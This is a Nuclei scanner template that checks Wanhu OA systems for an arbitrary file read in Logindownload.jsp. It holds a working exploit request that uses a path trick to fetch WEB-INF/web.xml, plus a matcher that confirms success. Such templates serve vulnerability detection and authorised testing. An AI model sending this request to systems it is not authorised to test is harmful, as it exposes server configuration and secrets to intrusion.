id: wanhu-oa-logindownload-fileread

info:
  name: 万户OA Logindownload.jsp 任意文件读取
  author: SleepingBag945
  severity: high


http:
  - raw:
      - |
        GET /defaultroot/public/edit/logindownload/Logindownload.jsp;?fileName=WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"<web-app")

